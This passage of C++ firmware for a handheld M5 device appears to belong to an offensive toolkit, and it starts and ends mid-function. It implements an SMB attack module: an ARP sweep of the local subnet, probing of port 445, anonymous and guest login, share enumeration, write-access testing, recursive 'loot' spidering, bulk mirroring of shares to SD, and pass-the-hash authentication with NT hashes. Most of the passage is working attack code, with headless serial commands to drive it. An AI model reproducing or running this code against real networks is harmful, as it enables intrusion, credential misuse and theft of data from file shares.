    } catch(...) { f.println("# stopped: out of memory (partial)"); aborted=true; }  // never abort()
    f.printf("# done: %ld items in %ld dir(s), %ld loot%s\n", count, dirs, loot, aborted?" (partial)":"");
    f.close();
    if(lf){ lf.printf("# %ld loot item(s)%s\n", loot, aborted?" (partial)":""); lf.close(); }
    if(lootOut) *lootOut=loot;
    smbLog("SPIDER "+s.host.toString()+" "+share+"\\"+startPath+" -> "+String(count)+" items, "+String(loot)+" loot"+(aborted?" (partial)":""));
    return count;
}

// recursively download (mirror) <share> from startPath to /evil/smb/mirror/<share>/...
// skips files larger than maxSize (0 = no limit). Backspace aborts. Returns files
// written, -1 on error. bytesOut/skipOut optional.
static long smbMirror(Smb2& s, const String& share, const String& startPath, uint64_t maxSize,
                      String* rootOut=nullptr, long* bytesKOut=nullptr, long* skipOut=nullptr){
    smbEnsureDir();
    String base="/evil/smb/mirror/"+smbSafeName(share);
    if(rootOut) *rootOut=base;
    smbChrome("MIRROR", "", share+"\\"+startPath, "DEL:abort");
    const int MAX_DEPTH=40;
    std::vector<String> stack; stack.push_back(startPath);
    long files=0, skipped=0; long long bytes=0; uint32_t lastDraw=0; bool aborted=false;
    try {
    while(!stack.empty()){
        String dir=stack.back(); stack.pop_back();
        int depth = dir.length()?1:0; for(size_t i=0;i<dir.length();i++) if(dir[i]=='\\') depth++;
        std::vector<SmbEntry> entries;
        if(!s.listDir(dir,entries)) continue;
        std::vector<String> subdirs;
        for(auto& en:entries){
            String full = dir.length()? (dir+"\\"+en.name) : en.name;
            String sdRel=full; sdRel.replace('\\','/');
            String sdPath=base+"/"+sdRel;
            if(en.isDir){ if(depth<MAX_DEPTH && stack.size()+subdirs.size()<1500){ sdMkdirp(sdPath+"/x"); subdirs.push_back(full); } }
            else {
                long w=smbDownloadTo(s,full,sdPath,maxSize,false);
                if(w==-2) skipped++;
                else if(w>=0){ files++; bytes+=w; }
            }
            if(millis()-lastDraw>180){
                M5.Display.fillRect(2,50,234,50,SMB_BG);
                M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
                M5.Display.setTextColor(SMB_TEXT,SMB_BG); M5.Display.setCursor(8,54);
                M5.Display.printf("files %ld", files);
                M5.Display.setCursor(8,68); M5.Display.printf("size  %lldKB", bytes/1024);
                M5.Display.setTextColor(SMB_FRAME,SMB_BG); M5.Display.setCursor(8,82);
                M5.Display.printf("skip  %ld", skipped);
                M5.Display.display(); lastDraw=millis();
            }
            M5.update(); cardUpdate();
            if(kp(KEY_BACKSPACE)){ aborted=true; break; }
        }
        if(aborted) break;
        for(int i=(int)subdirs.size()-1;i>=0;i--) stack.push_back(subdirs[i]);
    }
    } catch(...) { aborted=true; }   // OOM on a huge tree -> partial, never abort()
    if(bytesKOut) *bytesKOut=(long)(bytes/1024);
    if(skipOut)   *skipOut=skipped;
    smbLog("MIRROR "+s.host.toString()+" "+share+"\\"+startPath+" -> "+String(files)+" files, "+String((long)(bytes/1024))+"KB, "+String(skipped)+" skipped"+(aborted?" (partial)":""));
    return files;
}

// auth badge shown in the title bar
static String smbBadge(Smb2& s){
    return s.authUser.length()? ("["+s.authUser+"]") : (s.authMode_guest?"[guest]":"[anon]");
}
static String smbDialectStr(uint16_t d){
    switch(d){ case 0x202:return "2.0.2"; case 0x210:return "2.1"; case 0x300:return "3.0"; case 0x302:return "3.0.2"; default:return "0x"+String(d,HEX); }
}
static String smbIdentityStr(Smb2& s){
    return s.authUser.length()? s.authUser : (s.authMode_guest?"guest":"anonymous");
}

// Write a one-file recon report for the host: identity, server name/domain,
// dialect, signing, and a per-share access matrix (R=read, W=write) for the
// CURRENT identity. The W probe creates+deletes a temp file (active, in scope on
// your own targets). Returns the SD path, or "" on failure.
static String smbWriteReport(Smb2& s, const std::vector<String>& shares,
                             std::function<void(int,int)> onProg=nullptr){
    smbEnsureDir();
    String path="/evil/smb/report_"+smbSafeName(s.host.toString())+".txt";
    File f=SD.open(path,FILE_WRITE); if(!f){ s.lastError="report open fail"; return ""; }
    f.println("=== SMB Explorer report ===");
    f.printf("host      : %s\n", s.host.toString().c_str());
    f.printf("name      : %s\n", s.targetName.length()?s.targetName.c_str():"(unknown)");
    f.printf("domain    : %s\n", s.targetDomain.length()?s.targetDomain.c_str():"(unknown)");
    f.printf("dialect   : SMB %s\n", smbDialectStr(s.dialect).c_str());
    f.printf("signing   : %s\n", s.signingRequired?"required":"optional");
    f.printf("identity  : %s\n", smbIdentityStr(s).c_str());
    f.printf("shares    : %d\n\n", (int)shares.size());
    f.println("access matrix (current identity):");
    f.println("  R = readable   W = writable   - = denied");
    int rN=0,wN=0;
    for(size_t i=0;i<shares.size();i++){
        if(onProg) onProg((int)i+1,(int)shares.size());
        char rc='-', wc='-';
        if(s.treeConnect(shares[i])){ rc='R'; rN++;
            if(s.testWrite("")){ wc='W'; wN++; }
            s.treeDisconnect();
        }
        f.printf("  [%c%c]  %s\n", rc, wc, shares[i].c_str());
    }
    f.printf("\nreadable: %d   writable: %d\n", rN, wN);
    f.printf("(loot: see loot_<share>.txt after a spider)\n");
    f.close();
    smbLog("REPORT "+s.host.toString()+" -> "+path+" (R="+String(rN)+" W="+String(wN)+")");
    return path;
}

// full host details, unclipped. Long names/domains wrap (small font) so they are
// fully readable instead of the "..tail" clipping used in the lists.
static void smbHostInfo(Smb2& s){
    smbChrome("HOST INFO", smbBadge(s), s.host.toString(), "OK/DEL: back");
    M5.Display.setTextFont(1); M5.Display.setTextSize(1); M5.Display.setTextWrap(true);
    int y=34;
    auto field=[&](const char* k, const String& v){
        M5.Display.setTextColor(SMB_TITLE,SMB_BG); M5.Display.setCursor(6,y); M5.Display.print(k);
        M5.Display.setTextColor(SMB_TEXT,SMB_BG);  M5.Display.setCursor(6,y+10);
        M5.Display.print(v.length()?v:String("(unknown)"));
        y += 24;                                   // room for one wrap line
    };
    field("name",   s.targetName);
    field("domain", s.targetDomain);
    M5.Display.setTextColor(SMB_TITLE,SMB_BG); M5.Display.setCursor(6,y);
    M5.Display.print("dialect SMB "+smbDialectStr(s.dialect)+"   signing "+(s.signingRequired?"required":"optional"));
    y+=12; M5.Display.setCursor(6,y); M5.Display.print("identity "+smbIdentityStr(s));
    M5.Display.setTextWrap(false); M5.Display.display();
    enterDebounce();
    while(true){ M5.update(); cardUpdate(); if(kp(KEY_BACKSPACE)||kp(KEY_ENTER)) break; delay(40); }
}

// pre-spider extension picker. Multi-select: OK toggles, ALL selects/deselects
// everything, (no ext) covers extensionless files, START launches. DEL cancels.
// Fills 'on' (extCount+1 flags); returns true to start, false to cancel.
static bool smbSpiderPick(std::vector<uint8_t>& on){
    int N=smbSpiderExtCount();
    on.assign(N+1, 1);                       // default: everything on (= full spider)
    const int total=N+3;                     // ALL + exts + (no ext) + START
    int idx=0, top=0;
    auto label=[&](int r)->String{
        if(r==0){ bool a=true; for(int i=0;i<N+1;i++) if(!on[i]){a=false;break;} return String(a?"[*] ALL":"[ ] ALL"); }
        if(r>=1 && r<=N) return String(on[r-1]?"[x] ":"[ ] ")+SPIDER_EXTS[r-1];
        if(r==N+1)       return String(on[N]?"[x] (no ext)":"[ ] (no ext)");
        return String(">> START SPIDER <<");
    };
    auto toggleAll=[&](){ bool a=true; for(int i=0;i<N+1;i++) if(!on[i]){a=false;break;} uint8_t v=a?0:1; for(int i=0;i<N+1;i++) on[i]=v; };
    auto draw=[&](){
        smbChrome("SPIDER FILTER","","pick extensions","OK:toggle  DEL:cancel");
        M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextWrap(false);
        for(int i=0;i<SMB_VIS;i++){ int o=top+i, y=SMB_LTOP+i*SMB_LH;
            if(o>=total){ M5.Display.fillRect(2,y,234,SMB_LH,SMB_BG); continue; }
            bool cur=(o==idx); uint16_t bg=cur?SMB_SEL:SMB_BG; M5.Display.fillRect(2,y,234,SMB_LH,bg);
            uint16_t fg = cur?SMB_TITLE : (o==total-1?SMB_ACT : (o==0?SMB_DIR:SMB_TEXT));
            M5.Display.setTextColor(fg,bg);
            M5.Display.setCursor(5,y+2);  M5.Display.print(cur?">":" ");
            M5.Display.setCursor(16,y+2); M5.Display.print(label(o));
        }
        if(total>SMB_VIS){ int trackH=SMB_LBOT-SMB_LTOP; int thumbH=max(6,trackH*SMB_VIS/total); int thumbY=SMB_LTOP+trackH*top/total;
            M5.Display.fillRect(237,SMB_LTOP,1,trackH,SMB_BG); M5.Display.fillRect(237,thumbY,1,thumbH,SMB_FRAME); }
        M5.Display.display();
    };
    enterDebounce(); draw();
    while(true){
        M5.update(); cardUpdate();
        if(kp(';')){ idx=(idx-1+total)%total; top=max(0,min(idx,total-SMB_VIS)); draw(); delay(130); }
        else if(kp('.')){ idx=(idx+1)%total; top=max(0,min(idx,total-SMB_VIS)); draw(); delay(130); }
        else if(kp(KEY_ENTER)){
            if(idx==0) toggleAll();
            else if(idx>=1 && idx<=N) on[idx-1]^=1;
            else if(idx==N+1) on[N]^=1;
            else { delay(120); return true; }        // START
            draw(); delay(130);
        }
        else if(kp(KEY_BACKSPACE)){ delay(120); return false; }
        delay(40);
    }
}

// browse a share (relative path navigation + download)
static void smbBrowse(Smb2& s, const String& share){
    String cur="";  // relative path, no leading backslash
    while(true){
        std::vector<SmbEntry> entries;
        smbMsg("Listing...", share+"\\"+cur);
        if(!s.listDir(cur,entries)){
            smbMsg("List failed",s.lastError,1500);
            if(cur.length()==0) return;                      // root failed -> leave share
            int sl=cur.lastIndexOf('\\'); cur=(sl<0)?"":cur.substring(0,sl); // else fall back one level
            continue;
        }
        std::vector<String> labels; std::vector<int> map; // -1 up, -3 spider, -4 mirror
        if(cur.length()){ labels.push_back(".. (up)"); map.push_back(-1); }
        labels.push_back("<spider to SD>");    map.push_back(-3);
        labels.push_back("<mirror to SD>");    map.push_back(-4);
        for(size_t i=0;i<entries.size();i++){
            String lbl = entries[i].isDir ? ("["+entries[i].name+"]")
                                          : (entries[i].name+"  "+smbHuman(entries[i].size));
            labels.push_back(lbl); map.push_back((int)i);
        }
        String sub = cur.length()? (share+"\\"+cur) : (share+"\\");
        int sel=smbSelectList(labels, "BROWSE", smbBadge(s), sub, "OK:open  DEL:leave");
        if(sel<0) return;                 // backspace: leave share
        int e=map[sel];
        if(e==-2) continue;
        if(e==-3){                        // spider the current folder recursively to SD
            std::vector<uint8_t> filter;
            if(!smbSpiderPick(filter)) continue;        // pick extensions first; DEL = cancel
            String outPath; long loot=0; long n=smbSpider(s,share,cur,&outPath,&loot,&filter);
            if(n>=0) smbMsg("Spider saved", String(n)+" items / "+String(loot)+" loot", 2500);
            else     smbMsg("Spider failed", s.lastError, 2000);
            continue;
        }
        if(e==-4){                        // mirror (recursive download) to SD, 10MB/file cap
            String root; long kb=0, skip=0; long nf=smbMirror(s,share,cur,10UL*1024*1024,&root,&kb,&skip);
            if(nf>=0) smbMsg("Mirror done", String(nf)+" files / "+smbHuman((uint64_t)kb*1024), 2800);
            else      smbMsg("Mirror failed", s.lastError, 2000);
            continue;
        }
        if(e==-1){ int sl=cur.lastIndexOf('\\'); cur=(sl<0)?"":cur.substring(0,sl); continue; }
        SmbEntry& en=entries[e];
        String child = cur.length()? (cur+"\\"+en.name) : en.name;
        if(en.isDir){ cur=child; continue; }
        // file: action
        std::vector<String> act={"Download to SD","Back"};
        int a=smbSelectList(act, "FILE", smbHuman(en.size), en.name, "OK:select  DEL:back");
        if(a==0){
            smbMsg("Downloading",en.name);
            long w=smbDownload(s,child,en.name);
            if(w>=0) smbMsg("Saved", en.name+"  "+smbHuman((uint64_t)w), 2000);
            else smbMsg("Download failed",s.lastError,2000);
        }
    }
}

// ===================== headless serial control (cycle 2) ===================
// Drives the exact same Smb2 client over USB serial, printing every step and
// NTSTATUS/lastError. Lets the whole feature be tested/driven without the
// on-device keyboard.  Commands (handled in checkSerialCommands):
//   smb_discover                 ARP sweep + TCP445 -> list hosts
//   smb_test [ip]                full pipeline: neg/auth/enum/list-root (default .151)
//   smb_ls   <ip> <share> [path] list one directory (path uses \ separators)
//   smb_get  <ip> <share> <path> download a file to /evil/smb/
// black the screen with a fixed banner so a headless serial op never draws over
// the menu, and restore the menu cleanly when the op ends.
static void smbSerialScreenBegin(const String& banner){
    inMenu=false;
    smbChrome("SMB EXPLORER","serial",banner,"driven over USB serial");
    M5.Display.setTextFont(1); M5.Display.setTextSize(1.5); M5.Display.setTextColor(SMB_TEXT,SMB_BG);
    M5.Display.setCursor((240-M5.Display.textWidth("see serial console"))/2,60); M5.Display.print("see serial console");
    M5.Display.display();
}
static void smbSerialScreenEnd(){
    inMenu=true; lastIndex=-1; drawMenu();    // lastIndex=-1 forces one clean menu repaint
}

static bool smbSerialConnectAuth(Smb2& s, IPAddress ip, bool forceGuest=false){
    Serial.printf("[SMB] connect %s:445 ... ", ip.toString().c_str());
    if(!s.connect(ip)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); return false; }
    Serial.println("ok");
    Serial.print("[SMB] negotiate ... ");
    if(!s.negotiate()){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); return false; }
    Serial.println("ok (SMB2)");
    Serial.printf("[SMB] auth %s ... ", forceGuest?"guest(forced)":"anon/guest");
    bool ok = forceGuest ? s.authenticateGuestOnly() : s.authenticate();
    if(!ok){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); return false; }
    Serial.printf("ok (%s)\n", s.authMode_guest?"GUEST":"ANONYMOUS");
    return true;
}

// Fast live-host sweep of the local /24.
//  etharp_request() from the app task does NOT populate the ARP cache (lwip
//  wants stack calls on the tcpip thread), so instead we send a tiny UDP
//  datagram to each address: that goes through the thread-safe socket path and
//  makes lwip resolve ARP first. Only hosts that actually answer ARP turn into
//  STABLE entries, which we then read back with etharp_get_entry -> live hosts.
//  Sent in batches with a settle delay so a small ARP table does not thrash;
//  'out' is accumulated across batches (so entries evicted later are still
//  kept), deduped, with our own IP dropped.
static void smbArpSweep(IPAddress net, std::vector<IPAddress>& out,
                        std::function<void(int,int)> onProg=nullptr){
    IPAddress self=WiFi.localIP();
    WiFiUDP u; u.begin(0);
    const int BATCH=32;
    for(int base=1; base<=254; base+=BATCH){
        int end=base+BATCH-1; if(end>254) end=254;
        for(int i=base;i<=end;i++){ IPAddress ip=net; ip[3]=i;
            u.beginPacket(ip,9); u.write((uint8_t)0); u.endPacket(); }   // port 9 = discard
        delay(160);                                   // let ARP replies land
        for(int k=0;k<128;k++){                       // scan the ARP table
            ip4_addr_t* ip=nullptr; struct netif* en=nullptr; struct eth_addr* ea=nullptr;
            if(etharp_get_entry(k,&ip,&en,&ea) && ip){
                IPAddress a; a.fromString(ipaddr_ntoa((ip_addr_t*)ip));
                if(a[0]!=net[0]||a[1]!=net[1]||a[2]!=net[2]) continue;   // different subnet
                if(a==self) continue;
                bool dup=false; for(auto&x:out) if(x==a){ dup=true; break; }
                if(!dup) out.push_back(a);
            }
        }
        if(onProg) onProg(end,254);
    }
    u.stop();
}

// quick recon: one SMB negotiate + NTLM Type1->Type2 round to read the server's
// computer name from the target info, then close. ~1 round-trip. "" if unknown.
static String smbIdentify(IPAddress ip){
    Smb2 s; String name="";
    if(s.connect(ip) && s.negotiate()){
        std::vector<uint8_t> t1; s.ntlmType1(t1);
        std::vector<uint8_t> b; smbPut16(b,25); b.push_back(0); b.push_back(1);
        smbPut32(b,0); smbPut32(b,0); smbPut16(b,0x58); smbPut16(b,t1.size());
        smbPut64(b,0); for(auto c:t1) b.push_back(c);
        if(s.send(SMB2_SESSION_SETUP,b)){
            std::vector<uint8_t> rx; uint32_t st=s.recv(rx);
            if(st==NT_MORE_PROCESSING && rx.size()>=64+8){
                uint16_t sbOff=smbGet16(&rx[64+4]); uint16_t sbLen=smbGet16(&rx[64+6]);
                if((uint32_t)sbOff+sbLen<=rx.size()){
                    uint8_t ch[8]; std::vector<uint8_t> ti;
                    s.ntlmType2(&rx[sbOff],sbLen,ch,ti); s.parseTargetInfo(ti);
                    name=s.targetName;
                }
            }
        }
    }
    s.close(); return name;
}

void smbSerialDiscover(){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    IPAddress net=WiFi.localIP(); net[3]=0;
    smbSerialScreenBegin("discover "+net.toString()+"/24");
    Serial.printf("[SMB] discover on %s/24 ...\n", net.toString().c_str());
    int found=0;
    // Phase 1: UDP-trigger ARP across the /24 -> live hosts
    std::vector<IPAddress> live;
    smbArpSweep(net, live);
    Serial.printf("[SMB] %d host(s) answered ARP\n",(int)live.size());
    // Phase 2: 445-probe only the hosts that answered ARP (short timeout)
    for(auto& ip : live){
        WiFiClient c;
        if(c.connect(ip,445,400)){ Serial.printf("[SMB]  445 OPEN  %s\n", ip.toString().c_str()); c.stop(); found++; }
    }
    Serial.printf("[SMB] discover done, %d host(s) with 445\n", found);
    smbSerialScreenEnd();
}

void smbSerialTest(const String& ipStr){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    IPAddress ip; String t=ipStr; t.trim();
    bool forceGuest=false;
    int sp=t.indexOf(' ');
    if(sp>=0){ String mode=t.substring(sp+1); mode.trim(); mode.toLowerCase(); forceGuest=(mode=="guest"); t=t.substring(0,sp); t.trim(); }
    if(t.length()==0){ Serial.println(F("Usage: smb_test <ip> [guest]")); return; }
    if(!ip.fromString(t)){ Serial.println(F("[SMB] bad ip")); return; }
    smbSerialScreenBegin("test "+ip.toString());
    Serial.printf("=== smb_test %s%s ===\n", ip.toString().c_str(), forceGuest?" (guest)":"");
    Smb2 s;
    if(!smbSerialConnectAuth(s,ip,forceGuest)){ smbSerialScreenEnd(); return; }
    Serial.print("[SMB] enum shares (srvsvc) ... ");
    std::vector<String> shares;
    if(!smbEnumShares(s,shares)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.printf("ok, %d share(s)\n", (int)shares.size());
    for(size_t i=0;i<shares.size();i++) Serial.printf("[SMB]  share[%d] = %s\n",(int)i,shares[i].c_str());
    // list the root of each non-admin share
    for(auto& sh : shares){
        if(sh.endsWith("$")){ Serial.printf("[SMB]  skip admin share %s\n", sh.c_str()); continue; }
        Serial.printf("[SMB] tree connect %s ... ", sh.c_str());
        if(!s.treeConnect(sh)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); continue; }
        Serial.println("ok");
        std::vector<SmbEntry> e;
        if(!s.listDir("",e)){ Serial.printf("[SMB]  list root FAIL (%s)\n", s.lastError.c_str()); }
        else { Serial.printf("[SMB]  %s\\ : %d entr(y/ies)\n", sh.c_str(), (int)e.size());
            for(auto& en : e) Serial.printf("[SMB]    %s %-28s %llu\n", en.isDir?"<DIR>":"     ", en.name.c_str(), (unsigned long long)en.size); }
        s.treeDisconnect();
    }
    s.close();
    Serial.println("=== smb_test done ===");
    smbSerialScreenEnd();
}

// split "<ip> <share> [path...]" ; path keeps everything after share (may hold spaces)
static bool smbSplitArgs(const String& args, IPAddress& ip, String& share, String& path){
    String a=args; a.trim();
    int s1=a.indexOf(' '); if(s1<0) return false;
    String ipS=a.substring(0,s1); ipS.trim();
    String rest=a.substring(s1+1); rest.trim();
    int s2=rest.indexOf(' ');
    share = (s2<0)? rest : rest.substring(0,s2);
    path  = (s2<0)? ""   : rest.substring(s2+1); path.trim();
    share.trim();
    return ip.fromString(ipS) && share.length();
}

void smbSerialLs(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    IPAddress ip; String share,path;
    if(!smbSplitArgs(args,ip,share,path)){ Serial.println(F("Usage: smb_ls <ip> <share> [path]")); return; }
    smbSerialScreenBegin("ls "+ip.toString()+" "+share);
    Smb2 s; if(!smbSerialConnectAuth(s,ip)){ smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] tree connect %s ... ", share.c_str());
    if(!s.treeConnect(share)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    std::vector<SmbEntry> e;
    if(!s.listDir(path,e)){ Serial.printf("[SMB] list FAIL (%s)\n", s.lastError.c_str()); }
    else { Serial.printf("[SMB] %s\\%s : %d entr(y/ies)\n", share.c_str(), path.c_str(), (int)e.size());
        for(auto& en : e) Serial.printf("[SMB]   %s %-28s %llu\n", en.isDir?"<DIR>":"     ", en.name.c_str(), (unsigned long long)en.size); }
    s.treeDisconnect(); s.close();
    smbSerialScreenEnd();
}

void smbSerialGet(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    IPAddress ip; String share,path;
    if(!smbSplitArgs(args,ip,share,path) || path.length()==0){ Serial.println(F("Usage: smb_get <ip> <share> <path>")); return; }
    smbSerialScreenBegin("get "+share);
    Smb2 s; if(!smbSerialConnectAuth(s,ip)){ smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] tree connect %s ... ", share.c_str());
    if(!s.treeConnect(share)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    int sl=path.lastIndexOf('\\'); String base=(sl<0)?path:path.substring(sl+1);
    Serial.printf("[SMB] download %s -> /evil/smb/%s\n", path.c_str(), base.c_str());
    long w=smbDownload(s,path,base);
    if(w>=0) Serial.printf("[SMB] saved %ld bytes to /evil/smb/%s\n", w, base.c_str());
    else Serial.printf("[SMB] download FAIL (%s)\n", s.lastError.c_str());
    s.treeDisconnect(); s.close();
    smbSerialScreenEnd();
}

// headless credentialed login test: "smb_login <ip> <share> <user> <pass> [path]"
// password token must not contain spaces (test helper); user may be DOMAIN\user.
void smbSerialLogin(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    String a=args; a.trim();
    // split into tokens: ip share user pass [path]
    std::vector<String> parts; { int s=0; for(int i=0;i<=a.length();i++){ if(i==a.length()||a[i]==' '){ if(i>s) parts.push_back(a.substring(s,i)); s=i+1; } } }
    if(parts.size()<4){ Serial.println(F("Usage: smb_login <ip> <share> <user> <pass> [path]")); return; }
    IPAddress ip; if(!ip.fromString(parts[0])){ Serial.println(F("[SMB] bad ip")); return; }
    String share=parts[1], user=parts[2], pass=parts[3];
    String path = parts.size()>=5 ? parts[4] : "";
    smbSerialScreenBegin("login "+share);
    Smb2 s;
    Serial.printf("[SMB] connect %s:445 ... ", ip.toString().c_str());
    if(!s.connect(ip)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    if(!s.negotiate()){ Serial.printf("[SMB] negotiate FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] login as '%s' ... ", user.c_str());
    if(!s.authenticateUser(user,pass)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    Serial.printf("[SMB] tree connect %s ... ", share.c_str());
    if(!s.treeConnect(share)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    std::vector<SmbEntry> e;
    if(!s.listDir(path,e)){ Serial.printf("[SMB] list FAIL (%s)\n", s.lastError.c_str()); }
    else { Serial.printf("[SMB] %s\\%s : %d entr(y/ies)\n", share.c_str(), path.c_str(), (int)e.size());
        for(auto& en : e) Serial.printf("[SMB]   %s %-28s %llu\n", en.isDir?"<DIR>":"     ", en.name.c_str(), (unsigned long long)en.size); }
    s.treeDisconnect(); s.close();
    Serial.println("=== smb_login done ===");
    smbSerialScreenEnd();
}

// headless pass-the-hash: "smb_pth <ip> <user> <nthash32hex> [share]"
void smbSerialPth(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    String a=args; a.trim();
    std::vector<String> parts; { int s=0; for(int i=0;i<=a.length();i++){ if(i==a.length()||a[i]==' '){ if(i>s) parts.push_back(a.substring(s,i)); s=i+1; } } }
    if(parts.size()<3){ Serial.println(F("Usage: smb_pth <ip> <user> <nthash32hex> [share]")); return; }
    IPAddress ip; if(!ip.fromString(parts[0])){ Serial.println(F("[SMB] bad ip")); return; }
    String user=parts[1], hash=parts[2], share=parts.size()>=4?parts[3]:"";
    smbSerialScreenBegin("pth "+user);
    Smb2 s;
    Serial.printf("[SMB] connect %s:445 ... ", ip.toString().c_str());
    if(!s.connect(ip)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    if(!s.negotiate()){ Serial.printf("[SMB] negotiate FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] pass-the-hash as '%s' ... ", user.c_str());
    if(!s.authenticateHash(user,hash)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.printf("ok (signing %s)\n", s.signingRequired?"required":"optional");
    if(share.length()){
        Serial.printf("[SMB] tree connect %s ... ", share.c_str());
        if(s.treeConnect(share)){ Serial.println("ok");
            std::vector<SmbEntry> e;
            if(s.listDir("",e)){ Serial.printf("[SMB] %d entr(y/ies)\n",(int)e.size());
                for(auto&en:e) Serial.printf("[SMB]   %s %-28s %llu\n", en.isDir?"<DIR>":"     ", en.name.c_str(),(unsigned long long)en.size); }
            s.treeDisconnect();
        } else Serial.printf("FAIL (%s)\n", s.lastError.c_str());
    }
    s.close(); Serial.println("=== smb_pth done ==="); smbSerialScreenEnd();
}

// headless recon report + access matrix -> SD: "smb_report [ip]" (anon/guest)
void smbSerialReport(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    String t=args; t.trim(); IPAddress ip;
    if(t.length()==0){ Serial.println(F("Usage: smb_report <ip>")); return; }
    if(!ip.fromString(t)){ Serial.println(F("[SMB] bad ip")); return; }
    smbSerialScreenBegin("report "+ip.toString());
    Smb2 s;
    if(!smbSerialConnectAuth(s,ip)){ smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] name=%s domain=%s dialect=SMB%s signing=%s\n",
        s.targetName.c_str(), s.targetDomain.c_str(), smbDialectStr(s.dialect).c_str(), s.signingRequired?"required":"optional");
    std::vector<String> shares;
    if(!smbEnumShares(s,shares)||shares.empty()){ Serial.printf("[SMB] enum FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    String rp=smbWriteReport(s,shares,[](int c,int tt){ Serial.printf("[SMB] matrix %d/%d\n",c,tt); });
    if(rp.length()) Serial.printf("[SMB] report -> %s\n", rp.c_str());
    else Serial.printf("[SMB] report FAIL (%s)\n", s.lastError.c_str());
    s.close(); Serial.println("=== smb_report done ==="); smbSerialScreenEnd();
}

// headless write-access test: "smb_write <ip> <share> [path]" (active: makes a
// temp file with delete-on-close, in scope on your own targets)
void smbSerialWrite(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    String a=args; a.trim();
    std::vector<String> parts; { int s=0; for(int i=0;i<=a.length();i++){ if(i==a.length()||a[i]==' '){ if(i>s) parts.push_back(a.substring(s,i)); s=i+1; } } }
    if(parts.size()<2){ Serial.println(F("Usage: smb_write <ip> <share> [path]")); return; }
    IPAddress ip; if(!ip.fromString(parts[0])){ Serial.println(F("[SMB] bad ip")); return; }
    String share=parts[1], path=parts.size()>=3?parts[2]:"";
    smbSerialScreenBegin("write test "+share);
    Smb2 s;
    if(!smbSerialConnectAuth(s,ip)){ smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] tree connect %s ... ", share.c_str());
    if(!s.treeConnect(share)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    Serial.printf("[SMB] write test %s\\%s ... ", share.c_str(), path.c_str());
    bool w=s.testWrite(path);
    if(w) Serial.println("WRITABLE");
    else  Serial.printf("no (%s)\n", s.lastError.c_str());
    s.treeDisconnect(); s.close();
    Serial.println("=== smb_write done ==="); smbSerialScreenEnd();
}

// headless recursive spider -> SD: "smb_spider <ip> <share> [path]" (anon/guest)
void smbSerialSpider(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    IPAddress ip; String share,path;
    if(!smbSplitArgs(args,ip,share,path)){ Serial.println(F("Usage: smb_spider <ip> <share> [path]")); return; }
    smbSerialScreenBegin("spider "+share);
    Smb2 s; if(!smbSerialConnectAuth(s,ip)){ smbSerialScreenEnd(); return; }
    Serial.printf("[SMB] tree connect %s ... ", share.c_str());
    if(!s.treeConnect(share)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
    Serial.println("ok");
    Serial.printf("[SMB] spider \\%s ...\n", path.c_str());
    String outPath; long loot=0; long n=smbSpider(s,share,path,&outPath,&loot);
    if(n>=0) Serial.printf("[SMB] spider saved %ld items (%ld loot) to %s\n", n, loot, outPath.c_str());
    else     Serial.printf("[SMB] spider FAIL (%s)\n", s.lastError.c_str());
    s.treeDisconnect(); s.close();
    Serial.println("=== smb_spider done ===");
    smbSerialScreenEnd();
}

// headless recursive mirror -> SD: "smb_mirror <ip> <share> [path] [maxMB]" (anon/guest)
void smbSerialMirror(const String& args){
    if(WiFi.status()!=WL_CONNECTED){ Serial.println(F("[SMB] not connected to WiFi")); return; }
    // tokens: ip share [path] [maxMB] ; maxMB is the last token if numeric
